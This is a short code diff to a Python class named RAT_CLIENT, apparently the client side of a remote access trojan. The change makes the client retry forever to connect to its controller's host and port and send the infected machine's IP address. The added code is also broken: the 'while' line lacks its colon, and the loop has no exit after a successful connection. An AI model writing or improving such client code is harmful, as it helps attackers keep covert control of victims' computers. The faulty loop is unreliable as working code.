@@ -43,12 +43,13 @@ class RAT_CLIENT:
     def build_connection(self):
         global s
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((self.host, self.port))
-            sending = socket.gethostbyname(socket.gethostname())
-            s.send(sending.encode())
-        except socket.error as e:
-            print (e)
+        while 1==1
+            try:
+               s.connect((self.host, self.port))
+               sending = socket.gethostbyname(socket.gethostname())
+               s.send(sending.encode())
+            except socket.error as e:
+                print (e)
     
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
